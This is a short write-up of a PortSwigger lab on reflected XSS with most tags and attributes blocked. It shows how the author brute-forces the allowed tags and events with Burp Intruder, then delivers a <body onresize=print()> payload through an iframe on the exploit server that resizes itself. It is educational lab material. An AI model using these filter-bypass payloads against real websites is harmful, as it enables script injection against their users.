# Lab: Reflected XSS into HTML context with most tags and attributes blocked
# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked

```bash
<img src=0 onerror=alert()>

# Searching that returns "Tag is not allowed".

# So we need to brute force all tags in https://portswigger.net/web-security/cross-site-scripting/cheat-sheet.
```
```bash
# Copy tags to clipboard and use intruder to brute force. <§§> use targets this way.
# body tag gave 200 ok response so we will try it again.

<body onload=alert()>

# This resulted in "Attribute is not allowed" now we need to brute force it.

```
```bash
# <body §§=1> now we need to brute force it this way.
# We got multiple working events we will use onresize.

<body onresize=print()>
# This works when you change size print() works.
# But this lab requires more it want's it to be automated.
```

```bash
# Click to exploit server and change body to this:

<iframe src="https://0a3b008e03aa6234807b357d00af0030.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E"onload=this.style.width='100px'>

# onload will work when page loads and after that it will change the width to activate onresize and our attack.
# onload is executed when the iframe finishes loading.
```
